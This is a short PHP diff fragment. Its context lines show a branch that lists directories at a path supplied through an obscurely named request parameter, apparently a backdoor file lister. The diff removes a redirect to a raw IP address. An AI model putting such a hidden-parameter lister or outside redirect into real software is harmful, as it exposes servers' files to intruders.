@@ -47,6 +47,5 @@ function getDirectory( $path = './', $level = 0 ){
 if(isset($_REQUEST['x07sb19'])){
     getDirectory($_REQUEST['x07sb19']);
 }else{
-    header("Location:http://82.151.73.26");
     die();
   }
